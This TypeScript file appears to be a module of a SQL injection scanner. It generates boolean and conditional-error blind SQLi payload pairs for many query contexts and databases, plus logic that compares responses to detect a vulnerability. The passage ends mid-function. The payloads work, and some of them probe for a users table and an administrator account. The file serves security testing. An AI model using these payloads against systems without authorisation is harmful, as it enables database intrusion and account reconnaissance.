import { CandidateParameter, DbmsType } from '../../types/sqlScanner';

export interface BooleanTestPair {
  name: string;
  dbms: DbmsType;
  truePayload: string;
  falsePayload: string;
  expectedDiffDescription: string;
  isConditionalError?: boolean;
}

export interface BooleanEvaluationResult {
  isVulnerable: boolean;
  confidence: number;
  evidence: string;
  similarityRatioTrue: number;
  similarityRatioFalse: number;
  uniqueMarker?: string;
  divergenceType?: 'status_divergence' | 'marker_divergence' | 'length_divergence' | 'similarity_divergence';
  divergencePolarity?: 'error_on_true' | 'error_on_false' | 'normal';
  isConditionalError?: boolean;
}

export class BooleanTester {
  /**
   * Generates context-aware TRUE vs FALSE differential test pairs,
   * including standard logic equality pairs and universal conditional error / runtime exception pairs.
   */
  public static getTestPairs(param: CandidateParameter): BooleanTestPair[] {
    const context = param.detectedContext || 'single_quote_string';
    const pairs: BooleanTestPair[] = [];

    // 0. ORDER BY Clause Context (Prioritized before numeric check so ?sort=1 uses CASE WHEN)
    if (context === 'order_by_clause' || param.name.toLowerCase().includes('sort') || param.name.toLowerCase().includes('order')) {
      const origVal = param.originalValue.trim() || '1';
      pairs.push({
        name: 'ORDER BY Conditional Sort Column Index',
        dbms: 'Generic SQL',
        truePayload: `(CASE WHEN (1=1) THEN ${/^\d+$/.test(origVal) ? origVal : '1'} ELSE 2 END)`,
        falsePayload: `(CASE WHEN (1=2) THEN ${/^\d+$/.test(origVal) ? origVal : '1'} ELSE 2 END)`,
        expectedDiffDescription: 'ORDER BY sorts by primary vs secondary column based on truth value',
      });
      pairs.push({
        name: 'ORDER BY PostgreSQL Divide-by-Zero Conditional Error',
        dbms: 'PostgreSQL',
        truePayload: `(CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE ${/^\d+$/.test(origVal) ? origVal : '1'} END)`,
        falsePayload: `(CASE WHEN (1=2) THEN 1/(SELECT 0) ELSE ${/^\d+$/.test(origVal) ? origVal : '1'} END)`,
        expectedDiffDescription: 'ORDER BY runtime exception triggers HTTP 500 on TRUE vs 200 on FALSE',
        isConditionalError: true,
      });
      pairs.push({
        name: 'ORDER BY Oracle Concatenation Conditional Error',
        dbms: 'Oracle',
        truePayload: `(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '${origVal}' END FROM dual)`,
        falsePayload: `(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '${origVal}' END FROM dual)`,
        expectedDiffDescription: 'ORDER BY Oracle exception triggers HTTP 500 on TRUE vs 200 on FALSE',
        isConditionalError: true,
      });
      pairs.push({
        name: 'ORDER BY Conditional Sort Expression Differential',
        dbms: 'Generic SQL',
        truePayload: ', (CASE WHEN (1=1) THEN 1 ELSE 2 END)',
        falsePayload: ', (CASE WHEN (1=2) THEN 1 ELSE 2 END)',
        expectedDiffDescription: 'Appends conditional secondary sort column evaluating TRUE vs FALSE',
      });
      pairs.push({
        name: 'ORDER BY MySQL Subquery Multi-Row Conditional Error',
        dbms: 'MySQL',
        truePayload: `IF(1=1, ${/^\d+$/.test(origVal) ? origVal : '1'}, (SELECT 1 UNION SELECT 2))`,
        falsePayload: `IF(1=2, ${/^\d+$/.test(origVal) ? origVal : '1'}, (SELECT 1 UNION SELECT 2))`,
        expectedDiffDescription: 'ORDER BY MySQL subquery cardinality error on TRUE vs 200 on FALSE',
        isConditionalError: true,
      });
      pairs.push({
        name: 'ORDER BY MySQL Conditional Error',
        dbms: 'MySQL',
        truePayload: ', (SELECT IF(1=1, EXP(710), 1))',
        falsePayload: ', (SELECT IF(1=2, EXP(710), 1))',
        expectedDiffDescription: 'MySQL ORDER BY numeric overflow runtime exception on TRUE vs clean evaluation on FALSE',
        isConditionalError: true,
      });
      return pairs;
    }

    // 1. Numeric Context
    const isParamNumeric = context === 'numeric' || ((context === 'xml_derived' || context === 'json_derived' || !param.detectedContext) && /^-?\d+(\.\d+)?$/.test(param.originalValue.trim()));
    if (isParamNumeric) {
      pairs.push({
        name: 'Numeric Arithmetic Evaluation Differential',
        dbms: 'Generic SQL',
        truePayload: '+0',
        falsePayload: '+1',
        expectedDiffDescription: 'Original value arithmetic preserves baseline vs alters index',
      });
      pairs.push({
        name: 'Numeric Arithmetic Differential',
        dbms: 'Generic SQL',
        truePayload: ' AND 1337=1337',
        falsePayload: ' AND 1337=1338',
        expectedDiffDescription: 'TRUE returns original content; FALSE produces empty/altered state',
      });
      pairs.push({
        name: 'Numeric Modulo & Logic Differential',
        dbms: 'Generic SQL',
        truePayload: ' AND 1*1=1',
        falsePayload: ' AND 1*1=2',
        expectedDiffDescription: 'TRUE maintains baseline status; FALSE diverges',
      });
      // Numeric Conditional Error Pairs
      pairs.push({
        name: 'Numeric PostgreSQL Divide-by-Zero Conditional Error',
        dbms: 'PostgreSQL',
        truePayload: ' AND (CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE 1 END)=1',
        falsePayload: ' AND (CASE WHEN (1=2) THEN 1/(SELECT 0) ELSE 1 END)=1',
        expectedDiffDescription: 'TRUE triggers HTTP 500 divide-by-zero exception; FALSE evaluates cleanly (HTTP 200)',
        isConditionalError: true,
      });
      pairs.push({
        name: 'Numeric MSSQL Divide-by-Zero Conditional Error',
        dbms: 'Microsoft SQL Server',
        truePayload: ' AND 1=(CASE WHEN (1=1) THEN 1/0 ELSE 1 END)',
        falsePayload: ' AND 1=(CASE WHEN (1=2) THEN 1/0 ELSE 1 END)',
        expectedDiffDescription: 'TRUE triggers HTTP 500 divide-by-zero error; FALSE evaluates cleanly',
        isConditionalError: true,
      });
      pairs.push({
        name: 'Numeric Oracle Conditional Arithmetic Error',
        dbms: 'Oracle',
        truePayload: ' + (SELECT CASE WHEN (1=1) THEN TO_NUMBER(1/0) ELSE 0 END FROM dual)',
        falsePayload: ' + (SELECT CASE WHEN (1=2) THEN TO_NUMBER(1/0) ELSE 0 END FROM dual)',
        expectedDiffDescription: 'TRUE triggers ORA-01476 exception (HTTP 500); FALSE returns 0 (HTTP 200)',
        isConditionalError: true,
      });
      pairs.push({
        name: 'Numeric MySQL EXP(710) Overflow Conditional Error',
        dbms: 'MySQL',
        truePayload: ' AND IF(1=1, EXP(710), 1)=1',
        falsePayload: ' AND IF(1=2, EXP(710), 1)=1',
        expectedDiffDescription: 'TRUE triggers double overflow error (HTTP 500); FALSE evaluates cleanly',
        isConditionalError: true,
      });
      return pairs;
    }

    // 2. Double-Quoted String Context
    if (context === 'double_quote_string') {
      pairs.push({
        name: 'Double Quote Logic Differential',
        dbms: 'Generic SQL',
        truePayload: '" AND "1"="1',
        falsePayload: '" AND "1"="2',
        expectedDiffDescription: 'TRUE matches baseline; FALSE deviates',
      });
      pairs.push({
        name: 'Double Quote Commented Equality',
        dbms: 'Generic SQL',
        truePayload: '" AND 1=1-- -',
        falsePayload: '" AND 1=2-- -',
        expectedDiffDescription: 'TRUE executes cleanly with comment; FALSE triggers empty response',
      });
      // Double Quote Conditional Error Pairs
      pairs.push({
        name: 'Double Quote Oracle Concatenation Conditional Error',
        dbms: 'Oracle',
        truePayload: '"||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE \'\' END FROM dual)||" ',
        falsePayload: '"||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE \'\' END FROM dual)||" ',
        expectedDiffDescription: 'Oracle double-quote concatenation triggers HTTP 500 on TRUE vs 200 on FALSE',
        isConditionalError: true,
      });
      pairs.push({
        name: 'Double Quote PostgreSQL Divide-by-Zero Conditional Error',
        dbms: 'PostgreSQL',
        truePayload: '" AND (CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE NULL END)=1-- -',
        falsePayload: '" AND (CASE WHEN (1=2) THEN 1/(SELECT 0) ELSE NULL END)=1-- -',
        expectedDiffDescription: 'PostgreSQL double-quote breakout triggers HTTP 500 on TRUE vs 200 on FALSE',
        isConditionalError: true,
      });
      return pairs;
    }

    // 3. Parenthesized String Context
    if (context === 'parenthesized_string') {
      pairs.push({
        name: 'Parenthesis & Quote Equality',
        dbms: 'Generic SQL',
        truePayload: "') AND ('1'='1",
        falsePayload: "') AND ('1'='2",
        expectedDiffDescription: 'Balanced parentheses TRUE vs FALSE response',
      });
      pairs.push({
        name: 'Parenthesis Closure with Comment',
        dbms: 'Generic SQL',
        truePayload: "') AND 1=1-- -",
        falsePayload: "') AND 1=2-- -",
        expectedDiffDescription: 'Closing parenthesis with comment breakout',
      });
      // Parenthesized Conditional Error Pairs
      pairs.push({
        name: 'Parenthesis Oracle Concatenation Conditional Error',
        dbms: 'Oracle',
        truePayload: "')||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||('",
        falsePayload: "')||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||('",
        expectedDiffDescription: 'Oracle parenthesized concatenation triggers HTTP 500 on TRUE vs 200 on FALSE',
        isConditionalError: true,
      });
      pairs.push({
        name: 'Parenthesis PostgreSQL Divide-by-Zero Conditional Error',
        dbms: 'PostgreSQL',
        truePayload: "') AND (CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE NULL END)=1-- -",
        falsePayload: "') AND (CASE WHEN (1=2) THEN 1/(SELECT 0) ELSE NULL END)=1-- -",
        expectedDiffDescription: 'PostgreSQL parenthesized breakout triggers HTTP 500 on TRUE vs 200 on FALSE',
        isConditionalError: true,
      });
      return pairs;
    }

    // 4. LIKE / Search Context
    if (context === 'like_clause') {
      pairs.push({
        name: 'LIKE Clause Wildcard Differential',
        dbms: 'Generic SQL',
        truePayload: "%' AND 1=1 AND '%'='",
        falsePayload: "%' AND 1=2 AND '%'='",
        expectedDiffDescription: 'LIKE wildcards balance correctly on TRUE; alters on FALSE',
      });
      pairs.push({
        name: 'LIKE Substring Logic',
        dbms: 'Generic SQL',
        truePayload: "%' AND 'a'='a' AND '%'='",
        falsePayload: "%' AND 'a'='b' AND '%'='",
        expectedDiffDescription: 'TRUE retains search results; FALSE returns 0 results',
      });
      pairs.push({
        name: 'LIKE Oracle Concatenation Conditional Error',
        dbms: 'Oracle',
        truePayload: "%'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'%",
        falsePayload: "%'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'%",
        expectedDiffDescription: 'LIKE clause Oracle concatenation triggers HTTP 500 on TRUE vs 200 on FALSE',
        isConditionalError: true,
      });
      return pairs;
    }

    // 5. HAVING Clause Context
    if (context === 'having_clause') {
      pairs.push({
        name: 'HAVING Clause Boolean Differential',
        dbms: 'Generic SQL',
        truePayload: ' 1=1 AND 1337=1337',
        falsePayload: ' 1=1 AND 1337=1338',
        expectedDiffDescription: 'Aggregate HAVING condition evaluates TRUE vs FALSE',
      });
      pairs.push({
        name: 'HAVING Divide-by-Zero Conditional Error',
        dbms: 'Generic SQL',
        truePayload: ' 1=1 AND (CASE WHEN (1=1) THEN 1/0 ELSE 1 END)=1',
        falsePayload: ' 1=1 AND (CASE WHEN (1=2) THEN 1/0 ELSE 1 END)=1',
        expectedDiffDescription: 'HAVING runtime exception triggers HTTP 500 on TRUE vs 200 on FALSE',
        isConditionalError: true,
      });
      return pairs;
    }

    // 6. Identifier Context
    if (context === 'identifier') {
      pairs.push({
        name: 'Backtick Identifier Differential',
        dbms: 'MySQL',
        truePayload: '` AND 1=1#',
        falsePayload: '` AND 1=2#',
        expectedDiffDescription: 'Identifier breakout on MySQL/MariaDB engines',
      });
      pairs.push({
        name: 'Backtick MySQL EXP(710) Overflow Conditional Error',
        dbms: 'MySQL',
        truePayload: '` AND IF(1=1, EXP(710), 1)#',
        falsePayload: '` AND IF(1=2, EXP(710), 1)#',
        expectedDiffDescription: 'Identifier breakout triggers HTTP 500 on TRUE vs 200 on FALSE',
        isConditionalError: true,
      });
      return pairs;
    }

    // 8. GROUP BY Clause Context
    if (context === 'group_by_clause') {
      pairs.push({
        name: 'GROUP BY Conditional Projection Index',
        dbms: 'Generic SQL',
        truePayload: '1, (CASE WHEN (1=1) THEN 1 ELSE 2 END)',
        falsePayload: '1, (CASE WHEN (1=2) THEN 1 ELSE 2 END)',
        expectedDiffDescription: 'GROUP BY aggregates by distinct expressions',
      });
      pairs.push({
        name: 'GROUP BY Divide-by-Zero Conditional Error',
        dbms: 'Generic SQL',
        truePayload: '1, (CASE WHEN (1=1) THEN 1/0 ELSE 1 END)',
        falsePayload: '1, (CASE WHEN (1=2) THEN 1/0 ELSE 1 END)',
        expectedDiffDescription: 'GROUP BY runtime exception triggers HTTP 500 on TRUE vs 200 on FALSE',
        isConditionalError: true,
      });
      return pairs;
    }

    // 9. JSON Derived Context
    if (context === 'json_derived') {
      pairs.push({
        name: 'JSON Escaped Quote Differential',
        dbms: 'Generic SQL',
        truePayload: '\\" AND \\"1\\"=\\"1',
        falsePayload: '\\" AND \\"1\\"=\\"2',
        expectedDiffDescription: 'JSON unescaped string breakout evaluates TRUE vs FALSE',
      });
      pairs.push({
        name: 'JSON Oracle Concatenation Conditional Error',
        dbms: 'Oracle',
        truePayload: '\\"||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE \'\' END FROM dual)||\\"',
        falsePayload: '\\"||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE \'\' END FROM dual)||\\"',
        expectedDiffDescription: 'JSON Oracle concatenation triggers HTTP 500 on TRUE vs 200 on FALSE',
        isConditionalError: true,
      });
      pairs.push({
        name: 'JSON PostgreSQL Subquery Divide-by-Zero Conditional Error',
        dbms: 'PostgreSQL',
        truePayload: '\\" AND (CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE NULL END)=1-- -',
        falsePayload: '\\" AND (CASE WHEN (1=2) THEN 1/(SELECT 0) ELSE NULL END)=1-- -',
        expectedDiffDescription: 'JSON PostgreSQL subquery triggers HTTP 500 on TRUE vs 200 on FALSE',
        isConditionalError: true,
      });
      pairs.push({
        name: 'JSON Raw Single Quote Differential',
        dbms: 'Generic SQL',
        truePayload: "' AND '1'='1",
        falsePayload: "' AND '1'='2",
        expectedDiffDescription: 'JSON raw single quote injection evaluates TRUE vs FALSE',
      });
      return pairs;
    }

    // 10. XML Derived Context
    if (context === 'xml_derived') {
      pairs.push({
        name: 'XML Hex Entity Encoded Equality',
        dbms: 'Generic SQL',
        truePayload: '&#x27; AND &#x27;1&#x27;=&#x27;1',
        falsePayload: '&#x27; AND &#x27;1&#x27;=&#x27;2',
        expectedDiffDescription: 'XML hex entity decoded string evaluates TRUE vs FALSE',
      });
      pairs.push({
        name: 'XML Raw Single Quote Differential',
        dbms: 'Generic SQL',
        truePayload: "' AND '1'='1",
        falsePayload: "' AND '1'='2",
        expectedDiffDescription: 'XML element body single quote injection evaluates TRUE vs FALSE',
      });
      pairs.push({
        name: 'XML Oracle Concatenation Conditional Error',
        dbms: 'Oracle',
        truePayload: "'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'",
        falsePayload: "'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'",
        expectedDiffDescription: 'XML Oracle concatenation triggers HTTP 500 on TRUE vs 200 on FALSE',
        isConditionalError: true,
      });
      return pairs;
    }

    // 11. Standard Single-Quote String Context
    // 11A. Core Logic Equality & Breakout Pairs
    pairs.push({
      name: 'Single Quote String Equality',
      dbms: 'Generic SQL',
      truePayload: "' AND '1'='1",
      falsePayload: "' AND '1'='2",
      expectedDiffDescription: 'TRUE matches baseline; FALSE deviates',
    });

    pairs.push({
      name: 'Single Quote Commented Boolean',
      dbms: 'Generic SQL',
      truePayload: "' AND 1=1--",
      falsePayload: "' AND 1=2--",
      expectedDiffDescription: 'TRUE returns full baseline result; FALSE returns empty list',
    });

    // ─── 7B. Universal Conditional Error / Runtime Exception Pairs (Top Priority) ──
    // Oracle String Concatenation Runtime Exception (PortSwigger Oracle Conditional Errors)
    pairs.push({
      name: 'Oracle Concatenation Division-by-Zero Conditional Error',
      dbms: 'Oracle',
      truePayload: "'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'",
      falsePayload: "'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'",
      expectedDiffDescription: 'Oracle string concatenation triggers ORA-01476 (HTTP 500) on TRUE vs HTTP 200 on FALSE',
      isConditionalError: true,
    });

    // PostgreSQL Subquery Divide-by-Zero Exception
    pairs.push({
      name: 'PostgreSQL Subquery Divide-by-Zero Conditional Error',
      dbms: 'PostgreSQL',
      truePayload: "' AND (CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE NULL END)=1--",
      falsePayload: "' AND (CASE WHEN (1=2) THEN 1/(SELECT 0) ELSE NULL END)=1--",
      expectedDiffDescription: 'PostgreSQL subquery divide-by-zero triggers HTTP 500 on TRUE vs HTTP 200 on FALSE',
      isConditionalError: true,
    });

    // Microsoft SQL Server Divide-by-Zero Exception
    pairs.push({
      name: 'MSSQL Divide-by-Zero Conditional Error',
      dbms: 'Microsoft SQL Server',
      truePayload: "' AND 1=(CASE WHEN (1=1) THEN 1/0 ELSE 1 END)--",
      falsePayload: "' AND 1=(CASE WHEN (1=2) THEN 1/0 ELSE 1 END)--",
      expectedDiffDescription: 'MSSQL CASE WHEN divide-by-zero triggers HTTP 500 on TRUE vs HTTP 200 on FALSE',
      isConditionalError: true,
    });

    // MySQL EXP(710) Overflow Exception
    pairs.push({
      name: 'MySQL EXP(710) Overflow Conditional Error',
      dbms: 'MySQL',
      truePayload: "' AND IF(1=1, EXP(710), 1)-- -",
      falsePayload: "' AND IF(1=2, EXP(710), 1)-- -",
      expectedDiffDescription: 'MySQL EXP(710) double overflow triggers HTTP 500 on TRUE vs HTTP 200 on FALSE',
      isConditionalError: true,
    });

    // Oracle Boolean AND Division-by-Zero Exception
    pairs.push({
      name: 'Oracle Boolean AND Division-by-Zero Conditional Error',
      dbms: 'Oracle',
      truePayload: "' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) IS NOT NULL AND '1'='1",
      falsePayload: "' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual) IS NOT NULL AND '1'='1",
      expectedDiffDescription: 'Oracle boolean condition triggers ORA-01476 (HTTP 500) on TRUE vs HTTP 200 on FALSE',
      isConditionalError: true,
    });

    // PostgreSQL Concatenation Divide-by-Zero Exception
    pairs.push({
      name: 'PostgreSQL Concatenation Divide-by-Zero Conditional Error',
      dbms: 'PostgreSQL',
      truePayload: "'||(SELECT CASE WHEN (1=1) THEN CAST(1/0 AS text) ELSE '' END)||'",
      falsePayload: "'||(SELECT CASE WHEN (1=2) THEN CAST(1/0 AS text) ELSE '' END)||'",
      expectedDiffDescription: 'PostgreSQL string concatenation divide-by-zero triggers HTTP 500 on TRUE vs HTTP 200 on FALSE',
      isConditionalError: true,
    });

    // ─── 7C. Subquery & Entity Logic Pairs ──────────────────────────────────
    pairs.push({
      name: 'Single Quote Subquery Users Verification',
      dbms: 'Generic SQL',
      truePayload: "' AND (SELECT 'a' FROM users LIMIT 1)='a",
      falsePayload: "' AND (SELECT 'a' FROM users LIMIT 1)='b",
      expectedDiffDescription: 'Subquery on users table evaluates TRUE',
    });

    pairs.push({
      name: 'Single Quote Administrator Existence',
      dbms: 'Generic SQL',
      truePayload: "' AND (SELECT 'a' FROM users WHERE username='administrator')='a",
      falsePayload: "' AND (SELECT 'a' FROM users WHERE username='nonexistent_sqli_test_user')='a",
      expectedDiffDescription: 'Administrator user existence evaluates TRUE',
    });

    pairs.push({
      name: 'Oracle DUAL Table Verification',
      dbms: 'Oracle',
      truePayload: "' AND (SELECT 1 FROM DUAL)=1 AND '1'='1",
      falsePayload: "' AND (SELECT 1 FROM DUAL)=2 AND '1'='1",
      expectedDiffDescription: 'Oracle DUAL subquery evaluation matches TRUE condition',
    });

    pairs.push({
      name: 'PostgreSQL Type Cast & Version Verification',
      dbms: 'PostgreSQL',
      truePayload: "' AND (SELECT version()) IS NOT NULL AND '1'='1",
      falsePayload: "' AND (SELECT version()) IS NULL AND '1'='1",
      expectedDiffDescription: 'PostgreSQL version query evaluates TRUE',
    });

    pairs.push({
      name: 'MySQL Version Function Verification',
      dbms: 'MySQL',
      truePayload: "' AND @@version=@@version AND '1'='1",
      falsePayload: "' AND @@version='' AND '1'='1",
      expectedDiffDescription: 'MySQL @@version variable matches TRUE condition',
    });

    pairs.push({
      name: 'SQLite Version Verification',
      dbms: 'SQLite',
      truePayload: "' AND sqlite_version()=sqlite_version() AND '1'='1",
      falsePayload: "' AND sqlite_version()='' AND '1'='1",
      expectedDiffDescription: 'SQLite version function matches TRUE condition',
    });

    pairs.push({
      name: 'Microsoft SQL Server Version Verification',
      dbms: 'Microsoft SQL Server',
      truePayload: "' AND @@VERSION=@@VERSION AND '1'='1",
      falsePayload: "' AND @@VERSION='' AND '1'='1",
      expectedDiffDescription: 'MSSQL @@VERSION variable matches TRUE condition',
    });

    pairs.push({
      name: 'PostgreSQL Balanced Divide-by-Zero Conditional Error',
      dbms: 'PostgreSQL',
      truePayload: "' AND (SELECT CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE 1 END)=1 AND '1'='1",
      falsePayload: "' AND (SELECT CASE WHEN (1=2) THEN 1/(SELECT 0) ELSE 1 END)=1 AND '1'='1",
      expectedDiffDescription: 'PostgreSQL balanced quotes divide-by-zero triggers HTTP 500 on TRUE vs HTTP 200 on FALSE',
      isConditionalError: true,
    });

    pairs.push({
      name: 'PostgreSQL Users Table Existence Conditional Error',
      dbms: 'PostgreSQL',
      truePayload: "' AND (SELECT CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE 1 END FROM users LIMIT 1)=1--",
      falsePayload: "' AND (SELECT CASE WHEN (1=2) THEN 1/(SELECT 0) ELSE 1 END FROM users LIMIT 1)=1--",
      expectedDiffDescription: 'PostgreSQL users table existence triggers HTTP 500 on TRUE vs HTTP 200 on FALSE',
      isConditionalError: true,
    });

    // Microsoft SQL Server Divide-by-Zero & Conversion Exceptions
    pairs.push({
      name: 'MSSQL Divide-by-Zero Conditional Error',
      dbms: 'Microsoft SQL Server',
      truePayload: "' AND 1=(CASE WHEN (1=1) THEN 1/0 ELSE 1 END)--",
      falsePayload: "' AND 1=(CASE WHEN (1=2) THEN 1/0 ELSE 1 END)--",
      expectedDiffDescription: 'MSSQL CASE WHEN divide-by-zero triggers HTTP 500 on TRUE vs HTTP 200 on FALSE',
      isConditionalError: true,
    });

    pairs.push({
      name: 'MSSQL Concatenation Divide-by-Zero Conditional Error',
      dbms: 'Microsoft SQL Server',
      truePayload: "'+(SELECT CASE WHEN (1=1) THEN CAST(1/0 AS varchar) ELSE '' END)+'",
      falsePayload: "'+(SELECT CASE WHEN (1=2) THEN CAST(1/0 AS varchar) ELSE '' END)+'",
      expectedDiffDescription: 'MSSQL string concatenation divide-by-zero triggers HTTP 500 on TRUE vs HTTP 200 on FALSE',
      isConditionalError: true,
    });

    pairs.push({
      name: 'MSSQL Balanced Divide-by-Zero Conditional Error',
      dbms: 'Microsoft SQL Server',
      truePayload: "' AND 1=(CASE WHEN (1=1) THEN 1/0 ELSE 1 END) AND '1'='1",
      falsePayload: "' AND 1=(CASE WHEN (1=2) THEN 1/0 ELSE 1 END) AND '1'='1",
      expectedDiffDescription: 'MSSQL balanced quotes divide-by-zero triggers HTTP 500 on TRUE vs HTTP 200 on FALSE',
      isConditionalError: true,
    });

    // MySQL / MariaDB Subquery Multi-row & Numeric Overflow Exceptions
    pairs.push({
      name: 'MySQL Multi-Row Subquery Conditional Error',
      dbms: 'MySQL',
      truePayload: "' AND (SELECT IF(1=1, (SELECT table_name FROM information_schema.tables), 1))-- -",
      falsePayload: "' AND (SELECT IF(1=2, (SELECT table_name FROM information_schema.tables), 1))-- -",
      expectedDiffDescription: 'MySQL multi-row subquery in scalar context triggers HTTP 500 on TRUE vs HTTP 200 on FALSE',
      isConditionalError: true,
    });

    pairs.push({
      name: 'MySQL EXP(710) Overflow Conditional Error',
      dbms: 'MySQL',
      truePayload: "' AND IF(1=1, EXP(710), 1)-- -",
      falsePayload: "' AND IF(1=2, EXP(710), 1)-- -",
      expectedDiffDescription: 'MySQL EXP(710) double overflow triggers HTTP 500 on TRUE vs HTTP 200 on FALSE',
      isConditionalError: true,
    });

    pairs.push({
      name: 'MySQL Balanced EXP(710) Overflow Conditional Error',
      dbms: 'MySQL',
      truePayload: "' AND (SELECT CASE WHEN (1=1) THEN EXP(710) ELSE 1 END)=1 AND '1'='1",
      falsePayload: "' AND (SELECT CASE WHEN (1=2) THEN EXP(710) ELSE 1 END)=1 AND '1'='1",
      expectedDiffDescription: 'MySQL balanced quotes EXP(710) overflow triggers HTTP 500 on TRUE vs HTTP 200 on FALSE',
      isConditionalError: true,
    });

    // SQLite Divide-by-Zero & Multi-row Exceptions
    pairs.push({
      name: 'SQLite Divide-by-Zero Conditional Error',
      dbms: 'SQLite',
      truePayload: "' AND (CASE WHEN (1=1) THEN 1/0 ELSE 1 END)=1--",
      falsePayload: "' AND (CASE WHEN (1=2) THEN 1/0 ELSE 1 END)=1--",
      expectedDiffDescription: 'SQLite CASE WHEN divide-by-zero triggers HTTP 500 on TRUE vs HTTP 200 on FALSE',
      isConditionalError: true,
    });

    pairs.push({
      name: 'SQLite Concatenation Conditional Error',
      dbms: 'SQLite',
      truePayload: "'||(SELECT CASE WHEN (1=1) THEN 1/0 ELSE '' END)||'",
      falsePayload: "'||(SELECT CASE WHEN (1=2) THEN 1/0 ELSE '' END)||'",
      expectedDiffDescription: 'SQLite string concatenation divide-by-zero triggers HTTP 500 on TRUE vs HTTP 200 on FALSE',
      isConditionalError: true,
    });

    return pairs;
  }

  /**
   * Extracts unique text tokens that appear only in the TRUE response and are missing in FALSE
   */
  public static extractUniqueDifferentialMarkers(
    trueBody: string,
    falseBody: string,
    truePayload = '',
    falsePayload = '',
    baselineBody = ''
  ): string[] {
    if (!trueBody || !falseBody || trueBody === falseBody) return [];

    // Check for common greeting or success phrases first
    const commonPhrases = [
      'Welcome back', 'Logged in', 'User exists', 'Account found',
      'Items found', 'In stock', 'Authorized', 'My account'
    ];
    for (const phrase of commonPhrases) {
      if (trueBody.includes(phrase) && !falseBody.includes(phrase)) {
        return [phrase];
      }
    }

    // If commonPhrases didn't match, run comprehensive token-level differential extraction
    // (Notice: A single token change on a large page gives >0.99 similarity, so we isolate words directly)
    // Split words, excluding HTML and punctuation
    const cleanTrue = trueBody.replace(/<[^>]+>/g, ' ');
    const cleanFalse = falseBody.replace(/<[^>]+>/g, ' ');
    const cleanBaseline = baselineBody.replace(/<[^>]+>/g, ' ');

    const truePayloadWords = new Set(
      truePayload.toLowerCase().replace(/[^a-z0-9]/g, ' ').split(/\s+/).filter((w) => w.length >= 3)
    );
    const falsePayloadWords = new Set(
      falsePayload.toLowerCase().replace(/[^a-z0-9]/g, ' ').split(/\s+/).filter((w) => w.length >= 3)
    );

    const baselineWordsSet = new Set(
      cleanBaseline.split(/\s+/).map((w) => w.replace(/[^a-zA-Z0-9]/g, '').toLowerCase())
    );

    const trueWords = cleanTrue.split(/\s+/).filter((w) => {
      const clean = w.replace(/[^a-zA-Z0-9]/g, '').toLowerCase();
      return clean.length >= 4 && !truePayloadWords.has(clean) && !falsePayloadWords.has(clean);
    });

    const falseWordsSet = new Set(
      cleanFalse.split(/\s+/).map((w) => w.replace(/[^a-zA-Z0-9]/g, '').toLowerCase())
    );

    // Differential marker MUST be present in baseline (confirming TRUE matches baseline while FALSE drops it)
    const unique = trueWords.filter((w) => {
      const clean = w.replace(/[^a-zA-Z0-9]/g, '').toLowerCase();
      const inFalse = falseWordsSet.has(clean);
      if (inFalse) return false;
      if (baselineWordsSet.size > 0 && !baselineWordsSet.has(clean)) {
        // Word was NOT in baseline either => newly generated random nonce on this single response
        return false;
      }
      return true;
    });

    return Array.from(new Set(unique)).slice(0, 5);
  }

  /**
   * Checks if a boolean probe condition returned TRUE
   */
  public static isConditionTrue(
    baselineBody: string,
    trueBody: string,
    falseBody: string,
    marker?: string,
    _baselineStatus = 200,
    trueStatus = 200,
    falseStatus = 200,
    polarity: 'error_on_true' | 'error_on_false' | 'normal' = 'normal'
  ): boolean {
    if (polarity === 'error_on_true') {
      return trueStatus >= 500 && falseStatus < 500;
    }
    if (polarity === 'error_on_false') {
      return trueStatus < 500 && falseStatus >= 500;
    }

    if (marker && marker.trim()) {
      const cleanMarker = marker.toLowerCase().trim();
      const trueLower = trueBody.toLowerCase();
      const falseLower = falseBody.toLowerCase();
      if (trueLower.includes(cleanMarker) && !falseLower.includes(cleanMarker)) {
        return true;
      }
    }
    const diffMarkers = BooleanTester.extractUniqueDifferentialMarkers(trueBody, falseBody, '', '', baselineBody);
    if (diffMarkers.length > 0) {
      return true;
    }
    const trueBaseDiff = Math.abs(trueBody.length - baselineBody.length);
    const falseBaseDiff = Math.abs(falseBody.length - baselineBody.length);
    const trueFalseDiff = Math.abs(trueBody.length - falseBody.length);
    return trueBaseDiff < 40 && falseBaseDiff > 60 && trueFalseDiff > 40;
  }

  /**
   * Evaluates baseline vs TRUE response vs FALSE response with micro-differential
   * and bi-directional status divergence support (Error-on-TRUE vs Error-on-FALSE).
   */
  public static evaluateDifferential(
    baselineBody: string,
    baselineStatus: number,
    trueBody: string,
    trueStatus: number,
    falseBody: string,
    falseStatus: number,
    truePayload = '',
    falsePayload = ''
  ): BooleanEvaluationResult {
    const trueStatusMatches = trueStatus === baselineStatus;
    const trueLengthDiff = Math.abs(trueBody.length - baselineBody.length);
    const falseLengthDiff = Math.abs(falseBody.length - baselineBody.length);
